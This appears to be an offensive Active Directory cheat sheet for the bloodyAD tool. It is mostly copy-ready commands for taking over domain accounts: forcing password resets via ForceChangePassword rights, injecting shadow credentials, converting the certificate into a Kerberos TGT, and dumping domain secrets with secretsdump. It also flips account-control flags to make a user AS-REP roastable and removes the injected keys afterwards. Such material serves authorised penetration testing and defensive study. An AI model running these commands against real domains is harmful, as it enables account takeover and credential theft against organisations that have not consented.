# 08.08 bloodyAD Password Shadow Credential Operations

> Reset passwords (ForceChangePassword), inject shadow credentials (`msDS-KeyCredentialLink`), and flip UAC flags via `bloodyAD`.

## Overview

bloodyAD handles all password-related attacks: force-change password (requires ForceChangePassword ACE), add shadow credentials via msDS-KeyCredentialLink (requires GenericWrite), and UAC attribute manipulation for account states.

## Steps

- set password requires ForceChangePassword ACE or GenericAll on target; use --secure (LDAPS) for some DCs
- add shadowCredentials requires GenericWrite on target's msDS-KeyCredentialLink attribute
- Shadow credentials work on DCs running Windows Server 2016+ with PKINIT enabled
- Output of add shadowCredentials: PFX file and NT hash (via pass-the-cert)
- Use gettgtpkinit.py (PKINITtools) or certipy auth to convert cert to TGT
- Multiple shadow cred keys can coexist; each has a DeviceID for targeted removal

## Commands

### Force password change (ForceChangePassword / GenericAll)

```bash
bloodyAD -u attacker -p 'P@ss' -d DOMAIN --host DC_IP set password victimuser 'NewPass123!'
# LDAPS variant (if standard LDAP blocked):
bloodyAD -u attacker -p 'P@ss' -d DOMAIN --host DC_IP --secure set password victimuser 'NewPass123!'
```

### Add shadow credentials (GenericWrite on target)

```bash
bloodyAD -u attacker -p 'P@ss' -d DOMAIN --host DC_IP add shadowCredentials victimuser
# Output: saves cert.pfx + prints NT hash
# Then auth with cert:
bloodyAD -u victimuser -c 'pfx:victimuser.pfx:' -d DOMAIN --host DC_IP get object victimuser --attr unicodePwd
```

### Use shadow credential cert to get TGT (PKINITtools)

```bash
python3 gettgtpkinit.py -cert-pfx victimuser.pfx -pfx-pass '' DOMAIN/victimuser victimuser.ccache
export KRB5CCNAME=victimuser.ccache
# Then use TGT with any Kerberos-capable tool
impacket-secretsdump -k -no-pass DOMAIN/victimuser@DC01.DOMAIN.LOCAL
```

### Remove shadow credentials (cleanup)

```bash
# First list existing keys:
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP get object victimuser --attr msDS-KeyCredentialLink
# Then remove by DeviceID:
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP remove shadowCredentials victimuser --key <DeviceID_from_above>
```

### Unlock account / fix UAC flags

```bash
# Unlock (set lockoutTime to 0)
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP set object victimuser -v lockoutTime 0
# Enable account (normal account, not disabled)
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP set object victimuser -v userAccountControl 512
# Set DONT_REQUIRE_PREAUTH (AS-REP Roastable)
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP set object victimuser -v userAccountControl 4260352
```
